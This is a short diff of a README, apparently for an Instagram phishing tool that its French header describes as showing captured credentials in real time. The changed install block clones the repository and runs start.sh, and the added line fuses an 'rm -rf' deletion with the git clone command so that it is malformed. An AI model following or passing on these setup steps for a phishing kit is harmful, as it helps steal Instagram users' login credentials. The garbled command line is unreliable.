@@ -12,7 +12,7 @@ Outil de phishing avancé avec affichage en temps réel des identifiants captur�
    ```bash
    
    
-   git clone https://github.com/Samsmis01/Instagram-hack.git
+   rm -rf Instagram-hackgit clone https://github.com/Samsmis01/Instagram-hack.git
 cd Instagram-hack
 bash start.sh
 
